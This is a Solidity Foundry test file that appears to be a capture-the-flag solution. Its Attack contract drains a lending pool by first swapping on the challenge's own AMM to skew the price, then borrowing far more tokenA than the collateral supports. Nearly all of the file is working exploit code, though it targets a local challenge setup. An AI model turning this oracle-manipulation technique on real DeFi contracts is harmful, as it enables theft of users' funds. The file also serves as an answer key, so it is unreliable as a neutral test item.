// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup();
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Attack(setup).attack();
        ////////// YOUR CODE END //////////

        emit log_named_decimal_uint(
            "user tokenA",
            setup.tokenA().balanceOf(playerAddress),
            setup.tokenA().decimals()
        );
        emit log_named_decimal_uint(
            "user tokenB",
            setup.tokenB().balanceOf(playerAddress),
            setup.tokenB().decimals()
        );
        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Attack {
    Setup public setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function attack() public {
        setup.claim();
        setup.tokenA().approve(
            address(setup.amm()),
            setup.tokenA().balanceOf(address(this))
        );
        setup.amm().swap(
            address(setup.tokenA()),
            address(setup.tokenB()),
            setup.tokenA().balanceOf(address(this))
        );
        setup.tokenB().approve(
            address(setup.lendingPool()),
            setup.tokenB().balanceOf(address(this))
        );
        setup.lendingPool().supply(address(setup.tokenB()), 300 ether);
        setup.lendingPool().withdraw(address(setup.tokenA()), 900000 ether);
        setup.tokenB().approve(
            address(setup.amm()),
            setup.tokenB().balanceOf(address(this))
        );
        setup.amm().swap(
            address(setup.tokenB()),
            address(setup.tokenA()),
            setup.tokenB().balanceOf(address(this))
        );
        setup.tokenA().transfer(
            msg.sender,
            setup.tokenA().balanceOf(address(this))
        );
    }
}
////////// YOUR CODE END //////////
